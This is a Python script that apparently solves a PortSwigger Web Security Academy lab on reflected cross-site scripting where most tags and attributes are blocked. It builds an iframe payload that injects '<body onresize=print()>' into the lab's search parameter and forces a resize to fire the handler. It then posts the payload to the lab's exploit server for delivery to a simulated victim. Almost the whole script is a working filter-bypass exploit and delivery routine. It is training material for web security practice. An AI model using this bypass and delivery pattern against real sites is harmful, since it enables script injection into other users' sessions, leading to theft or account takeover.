###############################################################################
#
# Lab: Reflected XSS into HTML context with most tags and attributes blocked
#
# Hack Steps: 
#      1. Craft an iframe that, when loaded, will change the body width, 
#         causing the onresize event handler to be invoked
#      2. Deliver the exploit to the victim
#      3. The print() function will be called after they trigger the exploit
#
###############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0af000dd0367a9918053084a009f00cd.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a3800e903eaa989802e07b2014a006b.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    payload = f"""<iframe src="{LAB_URL}/?search=<body onresize=print()>" onload=this.style.width='100px'>"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    try:
        requests.post(EXPLOIT_SERVER_URL, data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The print() function will be called after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


